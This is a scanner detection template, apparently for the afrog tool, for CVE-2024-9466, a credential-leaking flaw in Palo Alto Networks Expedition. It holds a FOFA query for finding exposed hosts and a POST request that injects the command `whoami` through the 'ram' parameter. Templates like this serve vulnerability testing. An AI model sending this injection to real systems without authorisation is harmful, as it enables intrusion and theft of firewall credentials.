id: CVE-2024-9466

info:
  name: Palo Alto Expedition - Infomation Disclosure
  author: zan8in
  severity: high
  verified: true
  description: |-
    Palo Alto Networks Expedition的/API/convertCSVtoParquet.php接口存在信息泄露漏洞，从而导致PAN-OS防火墙的用户名、明文密码、设备配置和设备API密钥泄露。
    fofa: title="Expedition Project"
  affected: Palo Alto Networks Expedition < 1.2.96
  references:
    - https://mp.weixin.qq.com/s/uWqOZTEwWCyrtiVWBn2wMA
    - https://nvd.nist.gov/vuln/detail/CVE-2024-9466
  tags: cve,cve2024,palo,disclosure
  created: 2024/11/18

rules:
  r0:
    request:
      method: POST
      path: /API/convertCSVtoParquet.php
      body: ram=watchTowr`whoami`
    expression: response.status == 200 && response.body.bcontains(b"TaskUpdater-") && response.body.bcontains(b"__construct(") && response.body.bcontains(b"TaskUpdater.php")
expression: r0()
